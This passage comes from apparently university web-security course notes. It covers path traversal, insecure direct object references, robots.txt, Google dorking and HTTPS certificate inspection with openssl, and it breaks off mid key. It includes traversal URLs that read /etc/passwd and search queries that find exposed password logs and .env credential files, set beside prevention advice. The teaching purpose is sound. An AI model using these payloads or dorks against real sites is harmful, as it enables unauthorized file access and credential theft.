If the application does not verify the parameter, the attacker might be able to exploit the application and display an arbitrary file from the target system.
Normally an attacker would try to access password or configuration files to gain access to the system.
Obviously, server-side script files could be accessed to perform manual inspection for vulnerabilities.
Consider the following URL:</p><p><code>http://example.com/view.php?file=image.jpg</code></p><p>If the attacker wants to investigate the view.php file for possible exploitable coding mistakes, he would try to use the script in order to open the file:</p><p><code>http://example.com/view.php?file=view.php</code></p><p>It is likely that images are stored in a subdirectory, so the attacker might have to access the parent directory:</p><p><code>http://example.com/view.php?file=../view.php</code> or <code>http://example.com/view.php?file=../../view.php</code></p><p>Depending on the system, a backslash could also be used:</p><p><code>http://example.com/view.php?file=..\..\view.php</code></p><p>An example of accessing system files:</p><p><code>http://example.com/view.php?file=../../../../etc/passwd</code></p><p><img src=./assets/path_traversal.png alt="Path Traversal"></p><h2 id=path-traversal-prevention>Path Traversal Prevention</h2><p>The application should not allow directory traversal or the accessing of arbitrary files.
If the files to be accessed are known, the application should implement a mapping between the file and application-specific identifier.
This identifier can be hardcoded in the application to prevent any malicious attempts to modify it.</p><p>If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks:</p><ul><li>The application should validate the user input before processing it.
Ideally, the validation should compare against a whitelist of permitted values.
If that isn&rsquo;t possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters.</li><li>After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path.
It should verify that the canonicalized path starts with the expected base directory.</li></ul><p>Below is an example of some simple Java code to validate the canonical path of a file based on user input:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#000>File</span> <span style=color:#000>file</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>new</span> <span style=color:#000>File</span><span style=color:#ce5c00;font-weight:700>(</span><span style=color:#000>BASE_DIRECTORY</span><span style=color:#ce5c00;font-weight:700>,</span> <span style=color:#000>userInput</span><span style=color:#ce5c00;font-weight:700>);</span><span style=color:#a40000>`</span> 
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>if</span> <span style=color:#ce5c00;font-weight:700>(</span><span style=color:#000>file</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#c4a000>getCanonicalPath</span><span style=color:#ce5c00;font-weight:700>().</span><span style=color:#c4a000>startsWith</span><span style=color:#ce5c00;font-weight:700>(</span><span style=color:#000>BASE_DIRECTORY</span><span style=color:#ce5c00;font-weight:700>))</span> <span style=color:#ce5c00;font-weight:700>{</span><span style=color:#a40000>`</span> 
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>// process file
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#ce5c00;font-weight:700>}</span>
</span></span></code></pre></div><h1 id=insecure-direct-object-references>Insecure Direct Object References</h1><p>Insecure direct object reference vulnerability is similar to path traversal vulnerability.
The application allows access to resources using an identifier that is controllable by the user.
In this case, however, the identifier is not a file / path as is the case with path traversal.</p><p>Consider the following case where a user is able to view his own invoice:</p><p><code>http://www.example.com/view.php?invoice=24411</code></p><p>Now, by changing the invoice number the user might be able to access other invoices, including ones that are not his own, thereby gaining access to the sensitive information of other users.
Obviously the application should enforce access control over the items to be accessed.
If the application fails to do so, this would be a case of insecure direct object reference vulnerability.</p><p>When performing penetration tests, the application parameters should certainly be investigated by iterating through possible values and observing the responses.</p><p><img src=./assets/insecure_direct_object_references.png alt="Insecure Direct Object References"></p><h2 id=insecure-direct-object-references-prevention>Insecure Direct Object References Prevention</h2><p>First, you should control all normal, ajax and API requests when creating an application.
For example, can a read-only user write anything in the app?
Or can a non-admin user access and create API tokens that should only be created by an admin user?
So, in order to test all the possible IDOR vulnerabilities, you should think like a hacker.</p><p>You can provide permissions on your application for all endpoints.
If your <code>privatesection</code> endpoint includes the API requests such as <code>/api/privatesection/admins</code>, <code>/api/privatesection/console</code>, <code>/api/privatesection/tokens</code>, you can block the endpoint for non-admin users.</p><p>Moreover, to make the attacker’s job harder or prevent it altogether, you can use hash functions and hashed values instead of regular numbers and strings.</p><h2 id=robotstxt-preventing-caching>robots.txt: Preventing Caching</h2><p>The <strong>robots.txt</strong> file provides a list of instructions for automated Web crawlers, also called robots or bots.
Standardized at <a href=http://www.robotstxt.org/robotstxt.html>robotstxt</a>, this file allows you to define, with a great deal of precision, which files and directories are off-limits to Web robots.
The robots.txt file must be placed in the root of the Web server with permissions that allow the Web server to read the file.
Lines in the file beginning with a # sign are considered comments and are ignored.
Each line not beginning with a <code>#</code> should begin with either a User-agent or a disallow statement, followed by a colon and an optional space.
These lines are written to disallow certain crawlers from accessing certain directories or files.</p><p>Each Web crawler should send a user-agent field, which lists the name or type of the crawler.
The value of Google’s user-agent field is <code>Googlebot</code>.
To address a disallow to Google, the user-agent line should read:</p><p><code>User-agent: Googlebot</code></p><p>According to the original specification, the wildcard character <code>*</code> can be used in the user-agent field to indicate all crawlers.
The disallow line describes what, exactly; the crawler should not look at.</p><p><strong>NOTE:</strong> Hackers don’t have to obey your robots.txt file.
In fact, Web crawlers really don’t have to either, although most of the big-name Web crawlers will, if only for the “CYA” factor.
One fairly common hacker trick is to view a site’s robots.txt file first to get an idea of how files and directories are mapped on the server.
In fact a quick Google query can reveal lots of sites that have had their robots.txt files crawled.
This, of course, is a misconfiguration, because the robots.txt file is meant to stay behind the scenes.</p><h2 id=sitemapxml>Sitemap.xml</h2><p>The sitemap.xml is a simple XML page which could be available on some websites and provide a “roadmap” for Google to the important pages that need to be crawled.
It’s a SEO (Search Engine Optimization) tool to help with the visibility of your website on the internet, but it could also be useful for a hacker, serving basically the same purpose: to give him a roadmap to every page.</p><h2 id=examples-of-google-dorking>Examples of Google Dorking</h2><ul><li><p>Google Hacking tool from <a href=https://pentest-tools.com/information-gathering/google-hacking>Pentest-Tools</a></p></li><li><p>Passive Google Dork <a href=https://github.com/opsdisk/pagodo>Pagodo</a></p></li></ul><h3 id=explore-log-files-for-login-credentials>Explore LOG Files For Login Credentials</h3><p><code>allintext:password filetype:log after:2019</code> - Finds exposed log files that might contain passwords.</p><p><code>allintext:username filetype:log</code> - Finds logs that contain usernames.</p><p><strong>Prevention:</strong> Do not allow Google to access important data of your website, by properly configuring robots.txt.</p><h3 id=explore-configurations-using-env-files>Explore Configurations Using <strong>ENV</strong> files</h3><p>.env is used by various popular web development frameworks to declare general variables and configurations.</p><p><code>DB_USERNAME filetype:env</code><br><code>DB_PASSWORD filetype:enc=v</code></p><p>By using the command you can find a list of sites that expose their <em>.env</em> file on the internet.
Developers may accidentally include the <em>.env</em> file in the public directory of the website, which can cause great harm if cyber criminals find it.</p><p>If you click into any of the exposed .env files, you will notice unencrypted usernames, passwords and IPs are directly exposed in the search results.
<strong>Prevention:</strong> <em>.env</em> files should <strong>not</strong> be in a publicly accessible folder.</p><h2 id=wayback-machine>Wayback Machine</h2><p>The <a href=https://archive.org/web/>Wayback Machine</a> is a digital archive of the entire internet.
It allows the user to go “back in time” and see what websites looked like in the past.
For a hacker, it can be useful to see what information was displayed on a website a few months ago or even a few years ago.</p><h1 id=wrap-up>Wrap-up</h1><p>In this rapidly evolving world, the technologies we use change at a very fast pace.
We need to constantly implement new systems to help solve the issues that arise.
Since HTTP is stateless, dynamic web applications needed a way to preserve the state between requests, so they used cookies and sessions.</p><p>It’s very important to understand the difference between authentication and authorization.
Almost every web application on the internet today has one form or another of authentication and authorization.
Many <a href="https://techterms.com/definition/framework#:~:text=A%20framework%2C%20or%20software%20framework,programs%20for%20a%20specific%20platform">frameworks</a> and <a href=https://techterms.com/definition/cms>Content Management Systems</a> provide built-in implementations of authorization and authentication to make the job of web developers easier.</p><h1 id=browser-extensions>Browser Extensions</h1><p>Some browser extensions can make your life easier when interacting with the websites. Some examples would be:</p><ul><li><p><strong>EditThisCookie</strong>: Lets you quickly add, edit or delete a cookie.
It could be useful to open a context-menu with one click and edit a cookie on the fly while navigating, without the need to open the developer tools console.</p><ul><li>Google Chrome link: <a href=https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg>https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg</a></li><li>Mozilla Firefox link: <a href=https://addons.mozilla.org/en-US/firefox/addon/etc2/>https://addons.mozilla.org/en-US/firefox/addon/etc2/</a></li></ul></li><li><p><strong>ModHeader</strong>: Lets you add, modify and remove request headers and response headers. You can use this extension to set <strong>X-Forwarded-For</strong>, <strong>Authorization</strong>, <strong>Access-Control-Allow-Origin</strong> and other headers and remember your settings across your account.</p><ul><li>Google Chrome link: <a href=https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj>https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj</a></li><li>Mozilla Firefox link: <a href=https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/>https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/</a></li></ul></li><li><p><strong>Hasher</strong>: An extension to quickly generate most common <strong>hashes</strong> (<em>MD5</em>, <em>SHA-1</em>, <em>SHA-224</em>, <em>SHA-256</em>, <em>SHA-384</em>, <em>SHA-512</em>, etc), <strong>ciphers</strong> (<em>AES-256</em>, <em>DES</em>, <em>Triple-DES</em>, <em>RC4</em>, etc), <strong>ROT13</strong>, <strong>HMAC</strong>, <strong>CRC</strong> (<em>CRC-8</em>, <em>CRC 16</em>), for a given input. You can also convert timestamps to human readable formats, convert numbers from different bases (hex, binary, dec), encode or decode strings and convert between <em>ASCII</em>, <em>HEX</em>, <em>UTF-8</em>, etc.</p><ul><li>Google Chrome link: <a href=https://chrome.google.com/webstore/detail/hasher/kignjplbjlocolcfldfhbonmbblpfbjb>https://chrome.google.com/webstore/detail/hasher/kignjplbjlocolcfldfhbonmbblpfbjb</a></li></ul></li></ul><h1 id=further-reading>Further Reading</h1><ul><li>[1] Metropolia University of Applied Sciences - Applied Web Application Security Course</li><li>[2] <a href=https://en.wikipedia.org/wiki/HTTP_cookie>https://en.wikipedia.org/wiki/HTTP_cookie</a></li><li>[3] <a href=https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other>https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other</a></li><li>[4] <a href=https://docs.python-requests.org/en/master/user/advanced/>https://docs.python-requests.org/en/master/user/advanced/</a></li><li>[5] <a href=https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other>https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other</a></li><li>[6] <a href=https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg>https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg</a></li><li>[7] <a href=https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/>https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/</a></li><li>[8] <a href=https://searchsecurity.techtarget.com/tip/How-to-encrypt-and-secure-a-website-using-HTTPS>https://searchsecurity.techtarget.com/tip/How-to-encrypt-and-secure-a-website-using-HTTPS</a></li><li>[9] <a href=https://www.linkedin.com/learning/asp-dot-net-core-identity-authentication-management>https://www.linkedin.com/learning/asp-dot-net-core-identity-authentication-management</a></li><li>[10] <a href=https://techterms.com/definition/authentication>https://techterms.com/definition/authentication</a></li><li>[11] <a href=https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/>https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/</a></li><li>[12] <a href=https://portswigger.net/web-security/file-path-traversal>https://portswigger.net/web-security/file-path-traversal</a></li><li>[13] <a href=https://www.amazon.com/Google-Hacking-Penetration-Testers-1/dp/1931836361>https://www.amazon.com/Google-Hacking-Penetration-Testers-1/dp/1931836361</a></li><li>[14] <a href=https://securitytrails.com/blog/google-hacking-techniques>https://securitytrails.com/blog/google-hacking-techniques</a></li><li>[15] <a href=https://www.acunetix.com/websitesecurity/google-hacking/>https://www.acunetix.com/websitesecurity/google-hacking/</a></li><li>[16] <a href=https://www.sciencedirect.com/science/article/pii/B9781931836364500087>https://www.sciencedirect.com/science/article/pii/B9781931836364500087</a></li></ul><h1 id=activities>Activities</h1><p><strong>1.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Nobody loves me</a><br><strong>2.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Do you need glasses?</a><br><strong>3.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Chef hacky mchack</a><br><strong>4.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Santa</a><br><strong>5.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Great Names</a><br><strong>6.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Mind your own business</a><br><strong>7.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Beep Beep Boop</a><br><strong>8.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Let&rsquo;s traverse the universe</a><br><strong>9.</strong> <a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Color</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-1f60c8f1a3a525eb0a23908be44ee610>3 -</h1><h1 id=securing-communication>Securing Communication</h1><h2 id=introduction>Introduction</h2><p>As part of this session, we look into how HTTP connections can be made secure, to prevent attacks that capture traffic, also called <a href=https://www.thesslstore.com/blog/man-in-the-middle-attack-2/>man-in-the-middle (MitM) attacks</a>.
The session is focused on understanding certificates and HTTPS and investigating configurations of existing setups.</p><h2 id=reminders-and-prerequisites>Reminders and Prerequisites</h2><p>HTTP (<em>Hypertext Transfer Protocol</em>) is the main protocol of the web.
It has several characteristics:</p><ul><li>it is plain text</li><li>it doesn&rsquo;t maintain an active connection</li><li>it&rsquo;s a request-response protocol</li><li>it provides a series of codes to mark the types of requests and replies</li><li>HTTP requests consists of paths (routes) that are mapped to resources</li></ul><p>The lack of an active connection session is compensated by the use of cookies.
Similarly, the plain text nature of the protocol means that anyone could read contents in HTTP network packets.
This is alleviated by the use of HTTPS.
Nowadays, most connections use HTTPS precisely because of the need for confidentiality.</p><p>In the previous session, you used web browsers and the <a href=https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools>Developer Tools</a> feature of modern browsers to inspect traffic, update cookies, inspect rendered pages.
GUI web browsers (such as Firefox, Chrome, Edge, Safari) provide the appealing interface for users to surf the web.
For quick and dirty tasks such as testing connections, making requests and downloading large files, we use CLI web clients such as <code>curl</code> and <code>wget</code>.
We will be using these in this session as well.</p><h2 id=confidentiality>Confidentiality</h2><p>Confidentiality is a security property that prevents captured data from being understood by an attacker.
If an attacker captures data with confidentiality ensured, the attacker must not be able to extract actual information from it.
Confidentiality is generally provided with encryption.</p><p>For example, a classical HTTP connection is plain text and thus non-confidential.
Let&rsquo;s exemplify this.
On one terminal, start a <code>tcpdump</code> capture session for HTTP connections:</p><pre tabindex=0><code>$ sudo tcpdump -A tcp port 80
</code></pre><p>On another terminal, make an HTTP connection using <code>curl</code>:</p><pre tabindex=0><code>$ curl http://elf.cs.pub.ro
</code></pre><p>As the connection is HTTP, you will see plain text messages as part of the <code>tcpdump</code> output:</p><pre tabindex=0><code>Host: elf.cs.pub.ro
User-Agent: curl/7.58.0
Accept: */*

[...]
Date: Sun, 03 Jul 2022 15:51:46 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Mon, 02 Aug 2010 17:58:06 GMT
ETag: &#34;a8-48cdaf14da780&#34;
Accept-Ranges: bytes
Content-Length: 168
Vary: Accept-Encoding
Content-Type: text/html

&lt;html&gt;
	&lt;head&gt;
		&lt;meta name=&#34;google-site-verification&#34; content=&#34;gTsIxyV43HSJraRPl6X1A5jzGFgQ3N__hKAcuL2QsO8&#34; /&gt;
	&lt;/head&gt;

	&lt;body&gt;
		&lt;h1&gt;It works!&lt;/h1&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>However, if we used <code>curl</code> and an HTTPS connection:</p><pre tabindex=0><code>$ curl https://elf.cs.pub.ro
</code></pre><p>there would be no plain text output on the <code>tcpdump</code> console, because the connection is using a confidential (encrypted) channel.</p><p>The same traffic inspection can be done in a more visual manner using Wireshark.</p><p>As long as traffic is not encrypted, an attacker able to capture packets (either fooling someone to get the data or simply accessing a networking equipment along the way) will read the traffic contents.
HTTPS uses public key cryptography to ensure the confidentiality of network traffic.</p><h2 id=public-key-cryptography-certificates>Public Key Cryptography. Certificates</h2><p>There are mainly two types of encryption: symmetric and public-key encryption.</p><p>In symmetric encryption, a key is shared among the two ends in the communication.</p><p><img src=assets/symmetric-encryption.svg alt="symmetric encryption"></p><p>That same key is used for both encrypting and decrypting data.
AES (<em>Advanced Encryption Standard</em>) is the standard symmetric encryption algorithm.
The main benefit of symmetric encryption algorithms is their relative simplicity and speed: they are easy to implement and are fast, with the option of having hardware support.
The downside is related to the shared key.
If the key is captured by an attacker or if it is lost by one of the ends, confidentiality is compromised.</p><p>So, the goal is that each connection should use a temporary shared key.
After the connection ends, the shared key is discarded.
A new connection will generate a new key.
Of course, that shared key must be known only by the two ends.
For this two happen, key exchange algorithms, such as <a href=https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange>Diffie Hellman</a> are used.</p><p>Diffie-Hellman (often abbreviated as DH) is based on public-key encryption.
In short we use public-key encryption to set up a temporary shared key for the actual communication.</p><p>Public-key encryption, as its name implies, relies on a pair of private and public keys that are connected mathematically.
RSA (<em>Rivest Shamir Adleman</em> - named after its inventors) is the classical public key cryptographic algorithm.
The private key is generated as a random set of bytes and the public key is generated from it, via a mathematical algorithm.
The private key is only available to the owner, whereas the public key is available to everyone.
Anyone can encrypt a message using the public key, but only the owner can decrypt the message using the private key, as shown below.</p><p><img src=assets/public-key-encryption.svg alt="public-key encryption"></p><p>Because of this, public-key encryption is considered more secure than symmetric encryption, as it doesn&rsquo;t require the passing of a shared key between parties, an act that may be intercepted.
At the same time, public-key encryption is much slower than symmetric encryption.
Because of this, public-key encryption is only used to set up an initial session and enable a key exchange algorithm (such as Diffie-Hellman) to generate a temporary session-specific shared key.</p><h3 id=identity-management-certificates>Identity Management. Certificates</h3><p>A public-private key pair is not only used for encryption.
It&rsquo;s also used for identity management.</p><p>Identity management means making sure a given entity is who they claim they are.
In HTTPS that means that if we connect to <code>google.com</code> we are offered guarantees that the server we connect to is indeed <code>google.com</code>.
Otherwise, another server could impersonate the target server and capture all traffic.</p><p>Identity management relies on signing and verifying messages using public-private keys.
The private key is used to sign a message.
The signed message is provided publicly.
Then, the public key is used to verify the message.
This is called a <strong>digital signature</strong>, as shown below:</p><p><img src=assets/digital-signature.svg alt="digital signature"></p><p>In HTTPS, this means that the web server will sign the message with its private key and web clients will verify the message with the public key.</p><p>In order for this to work, the public key has to be attached the identity: the name of the server.
This is done via a <strong>digital certificate</strong>.
A certificate is a file that consists of a public key and an identity.
A certificate itself is also signed to ensure its validity.
This means that a certificate will also be verified using a public key, found as part of another certificate, as shown below:</p><p><img src=assets/digital-certificate.png alt="digital certificate"></p><p>This dependency between certificates creates a <strong>public-key infrastructure</strong> (PKI), on top of which self-signed root certificates are located.
Self-signed root certificates part of <strong>Certification Authorities</strong>.
These are entities that sign other certificates to validate the binding of a public key to an identity.</p><p>A browser stores root certificates as part of its default installation.
Each connection to the server will get the server to provide the certificate: identity and public key.
The browser uses the root certificate and intermediary certificates to verify the certificate.
After its verification the public key is used to create the actual HTTPS (secure) connection.</p><h3 id=inspecting-certificates>Inspecting Certificates</h3><p>To get a better understanding of how certificates work, let&rsquo;s take a look at one.</p><p>In order to get a certificate to inspect, it is easiest to export a root certificate from a browser.
In Firefox, we can use the Certificate Manager, as shown in the image below to export a certificate:</p><p><img src=assets/firefox-certificate-manager.png alt="Firefox Certificate Manager"></p><p>The CA (root) certificate from Verisign is located in <code>assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt</code>.
The certificate, as most certificates, is exported in PEM (<em>Privacy Enhanced Mail</em>) format, a Base64 encoding:</p><pre tabindex=0><code>$ cat assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
-----BEGIN CERTIFICATE-----
MIIEGjCCAwICEQCLW3VWhFSFCwDPrzhIzrGkMA0GCSqGSIb3DQEBBQUAMIHKMQsw
CQYDVQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsTFlZl
cmlTaWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWdu
LCBJbmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlT
aWduIENsYXNzIDEgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3Jp
dHkgLSBHMzAeFw05OTEwMDEwMDAwMDBaFw0zNjA3MTYyMzU5NTlaMIHKMQswCQYD
VQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsTFlZlcmlT
aWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWduLCBJ
bmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlTaWdu
IENsYXNzIDEgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkg
LSBHMzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN2E1Lm0+afY8wR4
nN493GwTFtl63SRRZsDHJlkNrAYIwpTRMx/wgzUfbhvI3qpuFU5UJ+/EbRrsC+MO
8ESlV8dAWB6jRx9x7GD2bZTIGDnt/kIYVt/kTEkQeE4BdjVjEjbdZrwBBDajVWjV
ojYJrKshJlQGrT/KFOCsyq0GHZXi+J3x4GD/wn91K0zM2v6HmSHquv4+VNfSWXjb
PG7PoBMAGrgnoeS+Z5bKoMWznN3JdZ7rMJpfo83ZrngZPyPpXNspva1VyBtUjGP2
6KbqxzcSXKMpHgLZ2x87tNcPVkeBFQRKr4Mn0cVYiMHd9qqnoxjaaKptEVHhv2Vr
n5Z20T0CAwEAATANBgkqhkiG9w0BAQUFAAOCAQEAq2aN17O6x5q25lXQBfGfMY1a
qtmqRiYPce2lrVNWYgFHKkTp/j90CxObufRNG7LRX7K20ohcs5/Ny9Sn2WCVhDr4
wTcdYcrnsMXlkdpUpqwxga6X3s0IrLjAl4B/bnKk52kTlWUfxJM8/XmPBNQ+T+r3
ns7NZ3xPZQL/kYVUc8f/NveGLezQXk//EZ9yBta4GvFMDSZl4kSAHsef493oCtrs
pSCAaWihT37ha88HQfqDjrw43bAuEbFrskLMmrz5SCJ5ShkPshw+IHTZasO+8ih4
E1Z5T21Q6huwtVexN2ZYI/PcD98Kh8TvhgXVOBRgmaNL3gaWcSzy27YfpO8/7g==
-----END CERTIFICATE-----
</code></pre><p>In its basic format, the certificate is a binary file.
The PEM format is used to make it printable.
The PEM format is also used for storing private and public SSH keys, so it may seem familiar.</p><p>We can inspect the certificate with <code>openssl</code>:</p><pre tabindex=0><code>$ openssl x509 -noout -text -in assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            8b:5b:75:56:84:54:85:0b:00:cf:af:38:48:ce:b1:a4
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C = US, O = &#34;VeriSign, Inc.&#34;, OU = VeriSign Trust Network, OU = &#34;(c) 1999 VeriSign, Inc. - For authorized use only&#34;, CN = VeriSign Class 1 Public Primary Certification Authority - G3
        Validity
            Not Before: Oct  1 00:00:00 1999 GMT
            Not After : Jul 16 23:59:59 2036 GMT
        Subject: C = US, O = &#34;VeriSign, Inc.&#34;, OU = VeriSign Trust Network, OU = &#34;(c) 1999 VeriSign, Inc. - For authorized use only&#34;, CN = VeriSign Class 1 Public Primary Certification Authority - G3
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:dd:84:d4:b9:b4:f9:a7:d8:f3:04:78:9c:de:3d:
                    dc:6c:13:16:d9:7a:dd:24:51:66:c0:c7:26:59:0d:
                    ac:06:08:c2:94:d1:33:1f:f0:83:35:1f:6e:1b:c8:
                    de:aa:6e:15:4e:54:27:ef:c4:6d:1a:ec:0b:e3:0e:
                    f0:44:a5:57:c7:40:58:1e:a3:47:1f:71:ec:60:f6:
                    6d:94:c8:18:39:ed:fe:42:18:56:df:e4:4c:49:10:
                    78:4e:01:76:35:63:12:36:dd:66:bc:01:04:36:a3:
                    55:68:d5:a2:36:09:ac:ab:21:26:54:06:ad:3f:ca:
                    14:e0:ac:ca:ad:06:1d:95:e2:f8:9d:f1:e0:60:ff:
                    c2:7f:75:2b:4c:cc:da:fe:87:99:21:ea:ba:fe:3e:
                    54:d7:d2:59:78:db:3c:6e:cf:a0:13:00:1a:b8:27:
                    a1:e4:be:67:96:ca:a0:c5:b3:9c:dd:c9:75:9e:eb:
                    30:9a:5f:a3:cd:d9:ae:78:19:3f:23:e9:5c:db:29:
                    bd:ad:55:c8:1b:54:8c:63:f6:e8:a6:ea:c7:37:12:
                    5c:a3:29:1e:02:d9:db:1f:3b:b4:d7:0f:56:47:81:
                    15:04:4a:af:83:27:d1:c5:58:88:c1:dd:f6:aa:a7:
                    a3:18:da:68:aa:6d:11:51:e1:bf:65:6b:9f:96:76:
                    d1:3d
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha1WithRSAEncryption
         ab:66:8d:d7:b3:ba:c7:9a:b6:e6:55:d0:05:f1:9f:31:8d:5a:
         aa:d9:aa:46:26:0f:71:ed:a5:ad:53:56:62:01:47:2a:44:e9:
         fe:3f:74:0b:13:9b:b9:f4:4d:1b:b2:d1:5f:b2:b6:d2:88:5c:
         b3:9f:cd:cb:d4:a7:d9:60:95:84:3a:f8:c1:37:1d:61:ca:e7:
         b0:c5:e5:91:da:54:a6:ac:31:81:ae:97:de:cd:08:ac:b8:c0:
         97:80:7f:6e:72:a4:e7:69:13:95:65:1f:c4:93:3c:fd:79:8f:
         04:d4:3e:4f:ea:f7:9e:ce:cd:67:7c:4f:65:02:ff:91:85:54:
         73:c7:ff:36:f7:86:2d:ec:d0:5e:4f:ff:11:9f:72:06:d6:b8:
         1a:f1:4c:0d:26:65:e2:44:80:1e:c7:9f:e3:dd:e8:0a:da:ec:
         a5:20:80:69:68:a1:4f:7e:e1:6b:cf:07:41:fa:83:8e:bc:38:
         dd:b0:2e:11:b1:6b:b2:42:cc:9a:bc:f9:48:22:79:4a:19:0f:
         b2:1c:3e:20:74:d9:6a:c3:be:f2:28:78:13:56:79:4f:6d:50:
         ea:1b:b0:b5:57:b1:37:66:58:23:f3:dc:0f:df:0a:87:c4:ef:
         86:05:d5:38:14:60:99:a3:4b:de:06:96:71:2c:f2:db:b6:1f:
         a4:ef:3f:ee
</code></pre><p>The options passed to the <code>openssl</code> command are:</p><ul><li><code>x509</code>: work with X.509 certificates - a standard for certificates</li><li><code>-noout</code>: do not print the PEM output of the certificate</li><li><code>-text</code>: print as text the contents of the certificate</li><li><code>-in</code>: the input certificate file</li></ul><p>As shown in the output, a certificate comprises of data and the signature of that data.
The data is primarily composed of the:</p><ul><li>identity (the <code>Subject</code> attribute): <code>C = US, O = "VeriSign, Inc.", OU = VeriSign Trust Network, OU = "(c) 1999 VeriSign, Inc. - For authorized use only", CN = VeriSign Class 1 Public Primary Certification Authority - G3</code></li><li>the public key (comprised of a <code>Modulus</code> and <code>Exponent</code>)</li></ul><p>There are two other important items:</p><ul><li>the issuer, i.e. the entity that signed the certificate;
in this case, it&rsquo;s a self signed certificate, so the <code>Issuer</code> is the same as the <code>Subject</code></li><li>the validity of the certificate, in this case it&rsquo;s <code>July 16, 2036</code></li></ul><p>Generally, a certificate is only valid for one year and then it will have to be renewed.
Renewing means a new public key is generated and, together with the same identity information, a new certificate.</p><p>The <code>openssl</code> utility has command-line options to only print parts of the certificate.
For example, to only print the issuer or the public key, we would use the <code>-issuer</code> or <code>-pubkey</code> options:</p><pre tabindex=0><code>$ openssl x509 -noout -issuer -in assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
issuer=C = US, O = &#34;VeriSign, Inc.&#34;, OU = VeriSign Trust Network, OU = &#34;(c) 1999 VeriSign, Inc. - For authorized use only&#34;, CN = VeriSign Class 1 Public Primary Certification Authority - G3

$ openssl x509 -noout -pubkey -in assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3YTUubT5p9jzBHic3j3c
bBMW2XrdJFFmwMcmWQ2sBgjClNEzH/CDNR9uG8jeqm4VTlQn78RtGuwL4w7wRKVX
x0BYHqNHH3HsYPZtlMgYOe3+QhhW3+RMSRB4TgF2NWMSNt1mvAEENqNVaNWiNgms
qyEmVAatP8oU4KzKrQYdleL4nfHgYP/Cf3UrTMza/oeZIeq6/j5U19JZeNs8bs+g
EwAauCeh5L5nlsqgxbOc3cl1nuswml+jzdmueBk/I+lc2ym9rVXIG1SMY/bopurH
